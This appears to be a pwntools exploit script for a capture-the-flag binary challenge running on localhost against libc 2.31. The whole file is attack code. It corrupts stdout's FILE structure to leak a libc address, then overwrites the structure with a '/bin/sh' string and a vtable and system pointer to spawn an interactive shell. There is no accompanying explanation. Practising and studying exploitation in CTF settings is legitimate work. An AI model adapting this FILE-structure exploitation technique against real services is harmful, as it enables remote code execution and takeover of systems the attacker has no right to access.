from pwn import *
context.binary = elf = ELF('./chall', checksec=False)
s = remote('localhost', 10000)

s.send(
    p64(0x1800) +
    p64(0) +
    p64(0) +
    p64(0) +
    b'\x00'
)

s.recv(8)
_IO_2_1_stdin_ = u64(s.recv(8))
libc = ELF('./libc-2.31.so', checksec=False)
libc.address = _IO_2_1_stdin_ - libc.symbols._IO_2_1_stdin_

_IO_libc_vtables = libc.address + 0x1ec8a0

payload = b'/\x80;/bin/sh\0'
payload += b'\x00' * (0xd8-len(payload))
payload += p64(_IO_libc_vtables)
payload += b'\x00' * (_IO_libc_vtables - libc.symbols._IO_2_1_stdout_ - len(payload))
payload += b'\x00' * 0x38
payload += p64(libc.symbols.system)

s.send(payload)
s.interactive()
